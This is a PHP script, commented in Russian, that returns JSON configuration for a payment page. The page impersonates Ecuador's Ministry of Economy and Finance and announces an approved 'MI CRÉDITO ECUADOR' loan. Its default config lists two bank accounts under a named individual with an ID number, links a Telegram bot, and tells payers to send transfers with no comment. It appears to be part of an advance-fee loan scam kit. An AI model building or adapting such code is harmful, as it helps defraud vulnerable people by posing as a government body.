<?php
// Разрешаем CORS для всех доменов (при необходимости ограничьте)
header('Content-Type: application/json; charset=utf-8');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: GET');
header('Cache-Control: no-cache, no-store, must-revalidate');

$configFile = __DIR__ . '/config_ec.json';

if (file_exists($configFile)) {
    $content = file_get_contents($configFile);
    echo $content;
} else {
    // Возвращаем дефолтную конфигурацию если файл не найден
    $default = [
        "banks" => [
            "pichincha" => [
                "enabled" => true,
                "name" => "Banco Pichincha",
                "account_type" => "Cuenta de Ahorros",
                "account_number" => "2201234567",
                "cedula" => "1723456789",
                "full_name" => "Mateo Alejandro Ramírez Suárez",
                "logo" => "https://upload.wikimedia.org/wikipedia/commons/thumb/6/6b/Banco_Pichincha_logo.svg/200px-Banco_Pichincha_logo.svg.png"
            ],
            "pacifico" => [
                "enabled" => true,
                "name" => "Banco del Pacífico",
                "account_type" => "Cuenta Corriente",
                "account_number" => "3309876543",
                "cedula" => "1723456789",
                "full_name" => "Mateo Alejandro Ramírez Suárez",
                "logo" => "https://upload.wikimedia.org/wikipedia/commons/thumb/f/fd/Banco_del_Pac%C3%ADfico_logo.svg/200px-Banco_del_Pac%C3%ADfico_logo.svg.png"
            ]
        ],
        "telegram" => "https://t.me/micreditosecuador_bot",
        "page" => [
            "country_title" => "REPÚBLICA DEL ECUADOR",
            "ministry" => "Ministerio de Economía y Finanzas",
            "title" => "Confirmación Oficial de Pago",
            "service_name" => "MI CRÉDITO ECUADOR",
            "service_type" => "ACREDITACIÓN DE CRÉDITO APROBADO"
        ],
        "alert" => [
            "enabled" => true,
            "text" => "<strong>Importante:</strong> Realiza el pago únicamente mediante transferencia bancaria (SPI / Banco Pichincha / Banco del Pacífico / Produbanco).<br>No escribas comentarios en la transferencia."
        ]
    ];
    echo json_encode($default, JSON_UNESCAPED_UNICODE);
}
?>